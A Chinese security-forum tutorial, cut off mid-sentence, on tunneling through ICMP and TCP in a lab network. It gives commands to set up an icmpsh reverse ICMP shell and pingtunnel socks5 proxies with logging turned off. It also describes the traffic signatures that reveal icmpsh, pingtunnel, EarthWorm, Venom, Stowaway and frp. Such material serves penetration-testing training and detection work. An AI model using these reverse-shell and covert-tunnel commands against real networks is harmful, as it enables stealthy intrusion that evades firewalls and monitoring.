---
title: 隧道代理攻防技术战争手册
url: https://forum.butian.net/share/4397
source: 奇安信攻防社区
date: 2025-06-12
fetch_date: 2025-10-06T22:47:49.375940
---

# 隧道代理攻防技术战争手册

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 隧道代理攻防技术战争手册

* [渗透测试](https://forum.butian.net/topic/47)

本文将深入解析各类隧道代理技术（如ICMP、HTTP、DNS、TCP/UDP等）的实现原理与实战应用，通过具体工具手法（如Ping、cURL、nslookup、Telnet等）演示如何伪装和转发流量，并详细介绍多级隧道代理的搭建方法与技巧，帮助读者掌握隐蔽通信、绕过防火墙限制的核心能力，提升网络渗透与安全防护的实战水平。

前置
--
| | |
|---|---|
| ICMP | ping ip/domain |
| HTTP | curl ip or domain |
| DNS | nslookup domain 8.8.8.8 |
| TCP/UDP | telnet ip port |
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-c8bba7273459215db1a6e980c97cc9ae23a14810.png)
攻击机器
本机IP：192.168.200.111
kali：192.168.99.129
目标机器
win8：192.168.99.134
第二层网卡：10.10.10.3
win10：10.10.10.4
开启3306
ICMP隧道技术
--------
\*\*什么是ICMP协议\*\*
ICMP（Internet Control Message Protocol，Internet控制报文协议）是Internet协议族中的一个协议，用于在IP网络中传递控制消息和错误报告。ICMP属于TCP/IP协议族中的第三层-网络层协议。
### ICMP隧道流量特征
正常情况下，单位时间内数据包发送的数量为一组。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-1d8157e6230dafa1f37e3f3b2eda606faf61eade.png)
单组数据包Data字段长度，Windows为32 bytes，Linux下为48 bytes，并且请求包和响应包长度相同。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-6b31f26f04ce98ae4c3742943600952fd1deacb8.png)
单组数据包Data字段内容中，Windows为`abcdefghijklmnopqrstuvwabcdefghi`，Linux下为`!”#$%&amp;’()+,-./01234567`。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-2bee17171f720d0bb3b4a2159f90cb5130fde254.png)
数据包Type字段类型为0或者8，表示请求和应答。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-027762720b6eeb8331770137061060316de58e82.png)
在icmpsh中，其交互过程的数据包中请求包和响应包长度明显不相同，并且Data字段内容明显为明文的敏感信息。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-b17e8f4db5ed9c9b8ef0f5f53c0e233f328332d1.png)
在pingtunnel中，明显地，单位时间内数据包的数量过大。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-e1e70a5e7e22ee3d997b0eb2137f7d1e7b4f4ecb.png)
单组数据包Data字段长度非默认长度，并且请求和应答报文的长度也不相同。在单组数据包Data字段内容中，在交互过程存在会话key和明文访问信息
pingtunnel在访问过程会把会话key和访问信息封装到icmp协议的data字段中。
流量检测关键点：
- 单位时间内数据包的数量
- 单组数据包Data字段长度
- 单组数据包Data字段内容
### icmpsh
icmpsh是⼀个简单的反向ICMP shell⼯具。与其他类似的开源⼯具相⽐，主要优势在于它不需要管理权限即可在⽬标机器上运⾏。
客户端只能在Windows机器运⾏，服务端可以在任何平台上运⾏。
下载
<https://github.com/bdamele/icmpsh>
使⽤
kali 192.168.200.129
win8 靶机 192.168.99.135
#### 服务端：
```c
git clone https://github.com/inquisb/icmpsh.git
#关闭icmp回复,如果要开启icmp回复，该值设置为0
#\_因为icmpsh工具要代替系统本身的icmp应答程序，所以需要提前关闭本地系统的icmp应答，否则Shell的运行会不稳定\_
sysctl -w net.ipv4.icmp\_echo\_ignore\_all=1
#运⾏，第⼀个IP是VPS的eth0⽹卡IP，第⼆个IP是⽬标机器出⼝的公⽹IP
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
#安装impacket
python2 -m pip install impacket
#这里可能报错 使用本地安装
https://github.com/fortra/impacket/releases/tag/impacket\_0\_11\_0
python2 setup.py install
python2 icmpsh\_m.py 192.168.99.129 192.168.99.135
```
#### 客户端：
```c
-t 主机ip地址以发送ping请求。这个选项是强制性的！
-r 发送⼀个包含字符串“Test1234”的测试icmp请求，然后退出。
-d 毫秒请求之间的延迟（毫秒）
-o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空⽩计数器。如果该计数器达到某个极限，从机将退出。
如果收到响应，计数器将设置回0。
-b 空⽩数量限制（退出前未答复的icmp请求）
-s 字节最⼤数据缓冲区⼤⼩（字节）
icmpsh.exe -t 192.168.99.129 -d 500 -b 30 -s 128
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-718ea66eca97c0b8445ca97e3d9e4abddce91328.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-a21c7f73c741103abdb8b1cb81ce636ac155be5a.png)
### pingtunnel
Pingtunnel 是⼀种通过 ICMP 发送 TCP/UDP 流量的⼯具。其是最流⾏的⼀款ICMP代理⼯具，提供对tcp/udp/sock5流量伪装成icmp流量进⾏转发的功能。需要root或者administrator/system权限。
下载
<https://github.com/esrrhs/pingtunnel>
#### ⾼权限条件下
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-88494aa927bfbeaf80d95e97cae99e9e65a4ead8.png)
##### 构建反向代理
###### 1）服务端
```c
-type server 代表开启ICMP SERVER端，等待客户端进⾏连接与通信。
-noprint 1 不在控制台打印⽇志
-nolog 1 不存储⽇志⽂件
echo 1 &gt; /proc/sys/net/ipv4/icmp\_echo\_ignore\_all
./pingtunnel -type server -noprint 1 -nolog 1
```
设置 socks5
```php
pingtunnel.exe -type client -l :4455 -s 192.168.99.129 -sock5 1 -noprint 1 -nolog 1
```
TCP隧道技术
-------
### TCP隧道流量特征
\*\*EarthWorm\*\*
ew在建立连接的过程中，数据包存在额外的数据特征“xx xx 00 00 00 00”
客户端发送“01 01 00 00 00 00”
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-6d7743416c0b24bcf71b51b7f2538135c3a3af7b.png)
服务端应答“01 02 00 00 00 00”，建立连接。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-9b0580392c81548e7444fe2bcb6a8dac86d47886.png)
\*\*Venom\*\*
未加密下venom在建立连接过程的过程中会先发起系列”00 00 00 00 00 00“
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-2adc7d979f5fe4c36f75419207a7ed8f0f9b4937.png)
接着通过携带“ABCDEFGH”，来判断是否为venom协议
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-672238a491293ec276731932ab9bb06ecde7d942.png)
同时，通过携带“VCMD”，作为协议的数据分割
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-f59275bf067d5224d3bcaeee9cb68831d4a42498.png)
执行命令过程也为明文信息
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-1fbccf3799ce3b84f5fb08ef5c6227e2b536d549.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-010c4d61ef51fa4ccf9fad9f7fce7829d713df6c.png)
使用venom的加密下，只存在较小的特征，如携带的数据全置零
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-74ba58ccbe682c5c381f1b53b16bf7d9718c4230.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-e95ed87c255a9e5785ee8460009cb63f3fc22101.png)
推测，其在只有在不使用端口复用时候，才存在
\*\*Stowaway\*\*
加密和未加密情况下，除了部分数据加密外，特征并没有发生变化。
stowaway在建立连接过程的过程中客户端会先发起系列”00 00 00 00 00 00“
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-90c4f7cfee10aed45b7d86c31cf34c7bb0a2114e.png)
在服务端确认相同的“会话key”后，客户端发起请求管理端的信息
```php
const ADMIN\_UUID = "IAMADMINXD"
const TEMP\_UUID = "IAMNEWHERE"
const TEMP\_ROUTE = "THEREISNOROUTE"
```
由于未加密，存在明文信息
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-e65dc201f78175e667a7ea2c00f1d81c55198c7a.png)
在建立连接后，伴随着大量重复ACK确认请求，怀疑是做心跳保持
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-5cf9c6b143fa4b78122afcd64dbf0647c8c66151.png)
\*\*Frp\*\*
1）未添加tls加密下的frp
客户端
```php
[common]
server\_addr = 192.168.1.131
server\_port = 7000
token = test@123
[socks5]
type = tcp
local\_ip = 192.168.3.73
remote\_port = 1081
plugin = socks5
plugin\_user = test
plugin\_passwd = 123
use\_encryption = true
use\_compression = true
```
服务端
```php
[common]
bind\_port = 7000
token = test@123
```
客户端携带版本架构等信息向服务端发起请求
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-e53de2bf303e298b53a7bd9eb76ae7a2568b5bfa.png)
服务端回应相关信息
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-1ddeedc0a186c6ff72d21168abdf999f8606ab64.png)
客户端和服务端之间传递会话id和会话key
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-a710074695bfad0b52f856c772800d3858f54599.png)
服务端创建socks5信息
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-fd0978965c7dda7be1170b69e8cfe48ad02b9d13.png)
2）添加了tls加密后的frp
客户端
```php
[common]
server\_addr = 192.168.1.131
server\_port = 7000
token = test@123
tls\_enable = true
[socks5]
type = tcp
local\_ip = 192.168.3.73
remote\_port = 1081
plugin = socks5
plugin\_user = test
plugin\_passwd = 123
use\_encryption = true
use\_compression = true
```
服务端
```php
[common]
bind\_port = 7000
token = test@123
```
添加了tls和加密压缩后的frp在通信过程已经没有了版本信息和会话信息。不过，在建立连接的过程启用tls前，客户端携带“0x17”,请求服务端
![image.png](https://cdn-yg-zzbm.y...